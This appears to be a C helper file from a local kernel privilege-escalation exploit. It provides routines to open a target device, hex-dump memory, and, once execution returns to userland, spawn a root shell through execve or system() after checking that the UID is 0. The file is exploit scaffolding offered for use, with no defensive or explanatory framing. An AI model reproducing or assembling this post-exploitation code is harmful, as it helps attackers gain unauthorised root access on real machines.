#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <errno.h>
#include "utils.h"

/* Open file stream for a device/module */
int open_dev(const char *path, int flags) 
{
    int fd = open(path, flags);
    if (fd < 0) {
        FAILURE("Failed to open %s: %s", path, strerror(errno));
        DIE("open_dev");
    }

    SUCCESS("Opened device: %s (fd=%d)", path, fd);
    return fd;
}

/* Print a hex dump of memory */
void hexdump(const char *label, const void *addr, size_t len)
{
    const unsigned char *p = (const unsigned char *)addr;
    printf("%s (%zu bytes):\n", label, len);
    for (size_t i = 0; i < len; ++i) {
        printf("%02x ", p[i]);
        if ((i + 1) % 16 == 0) putchar('\n');
    }
    if (len % 16 != 0) putchar('\n');
}

/* Spawn root shell if uid == 0 */
void get_shell(const char *mode)
{
    if (!mode || strlen(mode) == 0) {
        FAILURE("No mode specified for shell execution\n");
        _exit(1);
    }

    INFO("Returned to userland");

    if (getuid() != 0) {
        FAILURE("UID: %d — privilege escalation failed\n", getuid());
        DIE("no root");
    }

    if (strcmp(mode, "execve") == 0) {
        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);
        DIE("execve failed");
    } else if (strcmp(mode, "system") == 0) {
        system("/bin/sh");
        DIE("system() failed");
    } else if (access(mode, X_OK) == 0) {
        char *args[] = {(char *)mode, NULL};
        execve(mode, args, NULL);
        DIE("execve failed");
    } else {
        FAILURE("Invalid mode or path: %s\n", mode);
    }

    _exit(1); // failsafe
}

